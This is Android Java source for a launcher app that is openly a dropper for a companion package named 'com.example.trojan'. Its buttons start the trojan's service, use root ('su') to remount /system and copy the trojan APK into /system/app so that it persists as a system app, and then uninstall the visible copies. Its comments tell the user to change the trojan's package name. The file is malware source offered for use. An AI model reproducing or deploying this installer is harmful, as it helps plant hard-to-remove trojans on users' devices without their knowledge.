package com.example.starter;
import java.io.DataOutputStream;
import java.io.File;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.Toast;

public class MainActivity extends Activity {
  
  final String LOG_TAG = "myLogs";
  
    public void onCreate(Bundle savedInstanceState) {
    	super.onCreate(savedInstanceState);
    	//startservice();
    	setContentView(R.layout.main);
    	
    	final Context context = getApplicationContext();
    	Button non_root_button = (Button)findViewById(R.id.button1);
    	Button root_button = (Button)findViewById(R.id.button2);
    	Button uninstall_button = (Button)findViewById(R.id.button3);
    	
    	non_root_button.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View v) {
		    	try{
		    		Intent i = new Intent();
		    		i.setComponent(new ComponentName("com.example.trojan", "com.example.trojan.MyService")); // change if changing package name
		    		context.startService(i);
		    		Toast.makeText(context,"started successfully!",Toast.LENGTH_SHORT).show();
		    		}
		    	catch(Exception e){
		    		Toast.makeText(context,"error starting service!",Toast.LENGTH_SHORT).show();
		    		}
			}
		});
    	
    	root_button.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View v) {
				try {	
		    		String packagename="com.example.trojan";  // very important!!!! change if you want to change trojan's package name
		        	String apk=null;
		      	    String filename=null;
		      	    String dest=null;
		      		 PackageManager pm = context.getPackageManager();
		      		        ApplicationInfo ai = pm.getApplicationInfo(packagename, 0);
		      		        apk = ai.publicSourceDir;
		      		        filename=apk.substring(apk.lastIndexOf("/")+1);
		      	  	  if (!apk.equals(null)&&!filename.equals(null)){
		      	    	Process p=Runtime.getRuntime().exec("su");
		      		    DataOutputStream dos = new DataOutputStream(p.getOutputStream());
		      		    dest="/system/app/"+filename;
		      		    String cmd = "cp "+apk+" "+dest+"\n";
		      		    Log.d(LOG_TAG, cmd);
		      		    dos.writeBytes("mount -o rw,remount /proc /system\n");
		      		    dos.writeBytes(cmd);
		      		    dos.writeBytes("chmod 644 "+dest+"\n");
		      		    dos.writeBytes("exit\n");
		      		    dos.flush();
		      		    dos.close();
		      		    p.waitFor();
		      		 
		      	  	if(!dest.equals(null)){
		      	  	File file = new File(dest);
		      	  if(file.exists()){
		      		Toast.makeText(context,"installed to /system successfully!",Toast.LENGTH_SHORT).show();
		      	  	  
		      	  Uri packageURI2 = Uri.parse("package:"+"com.example.trojan");  // change
		      	  Intent uninstallIntent2 = new Intent(Intent.ACTION_DELETE, packageURI2);
		      	  startActivity(uninstallIntent2); 		      	  	  
		      	  					}
		      	  						}	  
		      	  	  												}
		      	  }
		      	  catch (Exception e) {
		      			Toast.makeText(context,"error installing!",Toast.LENGTH_SHORT).show();
		      		} 	  	
			} 
		});
    	
    	uninstall_button.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View v) {
		    	try{
		    		Uri packageURI = Uri.parse("package:"+MainActivity.class.getPackage().getName());
		        	Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
		        	startActivity(uninstallIntent);
		        	finish();
		    		}
		    	catch(Exception e){
		    		Toast.makeText(context,"error selfdeleting!",Toast.LENGTH_SHORT).show();
		    		}
			}
		});
    	

    	
    }
    
}
